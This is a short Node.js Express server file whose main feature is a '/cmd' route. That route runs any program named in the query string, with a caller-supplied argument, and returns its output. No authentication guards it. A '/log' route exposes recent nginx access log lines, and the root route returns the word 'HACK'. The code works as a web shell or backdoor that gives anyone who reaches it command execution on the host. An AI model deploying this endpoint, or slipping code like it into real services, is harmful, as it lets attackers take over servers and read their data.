const express = require("express");
const { spawn } = require("child_process");
const { exec } = require("child_process");
const path = require('path');
const app = express();
const router = express.Router();
const port = process.env.PORT || 3000;

//app.use(express.static(__dirname+"/render/"));

app.get('/',(req,res)=>{
    //res.sendFile(path.join(__dirname+'/index.html'));
    res.send('HACK');
})
app.get('/cmd',(req,res)=>{
    let cmd=spawn(req.query.cmd,[req.query.flag]);
    cmd.stdout.pipe(res);
})
app.get('/log',(req,res)=>{
    exec("tail -n 10 /var/log/nginx/access.log",(error, stdout, stderr) => {
        res.send(stdout)
    })
})

//app.use('/',router)

app.listen(port,()=>{
    console.log(`site is up and running in ${port}`)
})
